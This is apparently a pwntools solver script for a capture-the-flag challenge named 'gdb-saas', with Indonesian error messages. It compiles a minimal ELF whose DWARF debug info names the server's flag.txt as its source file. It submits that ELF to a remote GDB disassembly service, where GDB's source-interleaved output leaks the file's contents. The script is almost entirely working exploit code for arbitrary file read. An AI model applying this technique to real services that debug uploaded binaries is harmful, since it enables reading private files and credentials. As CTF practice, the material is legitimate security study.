        "code": "#!/usr/bin/env python3\n\nfrom __future__ import annotations\n\nimport base64\nimport json\nimport re\nimport shutil\nimport subprocess\nimport sys\nimport tempfile\nfrom pathlib import Path\n\nfrom pwn import args, context, log, process, remote\n\n\nBASE_DIR = Path(__file__).resolve().parent\nSERVER_PATH = BASE_DIR / \"server.py\"\nDEFAULT_HOST = \"gdb-saas-d10420d73a48.inst19.ctf.fortid.com\"\nDEFAULT_PORT = 1337\nTIMEOUT = 8\nFUNCTION_NAME = b\"/s main\"\nFLAG_RE = re.compile(rb\"FortID\\{[^}\\r\\n]+\\}\")\n\ncontext.log_level = \"info\"\n\n\ndef build_elf() -> bytes:\n    \"\"\"Build a tiny ELF whose DWARF line table names the challenge flag file.\"\"\"\n    source_path = str((BASE_DIR / \"flag.txt\").resolve())\n    c_source = (\n        f\"#line 1 {json.dumps(source_path)}\\n\"\n        \"int main(void) { return 0; }\\n\"\n    )\n\n    with tempfile.TemporaryDirectory(prefix=\".gdbsaas-build-\", dir=BASE_DIR) as tmp:\n        tmp_path = Path(tmp)\n        source = tmp_path / \"payload.c\"\n        binary = tmp_path / \"payload\"\n        source.write_text(c_source)\n        try:\n            subprocess.run(\n                [\"gcc\", \"-g\", \"-O0\", \"-o\", str(binary), str(source)],\n                cwd=tmp_path,\n                check=True,\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                timeout=TIMEOUT,\n            )\n        except FileNotFoundError as exc:\n            raise RuntimeError(\"gcc tidak ditemukan; diperlukan untuk membuat ELF DWARF\") from exc\n        except subprocess.CalledProcessError as exc:\n            detail = exc.stderr.decode(\"utf-8\", \"replace\")\n            raise RuntimeError(f\"gcc gagal membuat ELF:\\n{detail}\") from exc\n\n        elf_bytes = binary.read_bytes()\n\n    encoded_size = len(base64.b64encode(elf_bytes))\n    if encoded_size >= 30 * 1024:\n        raise RuntimeError(f\"ELF base64 terlalu besar untuk service ({encoded_size} byte)\")\n    return elf_bytes\n\n\ndef exchange(io, elf_bytes: bytes) -> bytes:\n    io.recvuntil(b\"Enter ELF bytes (base64): \", timeout=TIMEOUT)\n    io.sendline(base64.b64encode(elf_bytes))\n    io.recvuntil(b\"Enter function name: \", timeout=TIMEOUT)\n    io.sendline(FUNCTION_NAME)\n    return io.recvall(timeout=TIMEOUT)\n\n\ndef run_remote(elf_bytes: bytes) -> None:\n    host = args.HOST or DEFAULT_HOST\n    port = int(args.PORT or DEFAULT_PORT)\n    io = remote(host, port, ssl=True, timeout=TIMEOUT)\n    try:\n        output = exchange(io, elf_bytes)\n    finally:\n        io.close()\n\n    print(output.decode(\"utf-8\", \"replace\"), end=\"\")\n    match = FLAG_RE.search(output)\n    if not match:\n        raise RuntimeError(\"Output GDB tidak memuat flag; periksa path source DWARF dan respons service.\")\n    print(f\"<FLAG>{match.group().decode()}</FLAG>\")\n\n\ndef run_local(elf_bytes: bytes) -> None:\n    \"\"\"Run the supplied server locally with a harmless source marker if needed.\"\"\"\n    local_flag = BASE_DIR / \"flag.txt\"\n    created_marker = not local_flag.exists()\n    if created_marker:\n        local_flag.write_text(\"LOCAL_SOURCE_TEST_LINE\\n\")\n\n    try:\n        with tempfile.TemporaryDirectory(prefix=\".gdbsaas-local-\", dir=BASE_DIR) as tmp:\n            run_dir = Path(tmp)\n            shutil.copy2(local_flag, run_dir / \"flag.txt\")\n            io = process([sys.executable, str(SERVER_PATH)], cwd=str(run_dir), timeout=TIMEOUT)\n            try:\n                output = exchange(io, elf_bytes)\n            finally:\n                io.close()\n\n        text = output.decode(\"utf-8\", \"replace\")\n        print(text, end=\"\")\n        if \"Dump of assembler code for function main:\" not in text:\n            raise RuntimeError(\"GDB lokal tidak menghasilkan disassembly main.\")\n        if created_marker and \"LOCAL_SOURCE_TEST_LINE\" not in text:\n            raise RuntimeError(\"GDB lokal tidak membaca source marker dari DWARF.\")\n    finally:\n        if created_marker:\n            local_flag.unlink(missing_ok=True)\n\n\ndef main() -> None:\n    if not SERVER_PATH.is_file():\n        raise SystemExit(f\"server.py tidak ditemukan di {SERVER_PATH}\")\n    elf_bytes = build_elf()\n    log.info(f\"ELF carrier: {len(elf_bytes)} bytes; function name: {FUNCTION_NAME.decode()!r}\")\n\n    if args.REMOTE:\n        run_remote(elf_bytes)\n    else:\n        run_local(elf_bytes)\n\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except (RuntimeError, EOFError, TimeoutError) as exc:\n        log.failure(str(exc))\n        raise SystemExit(1)"
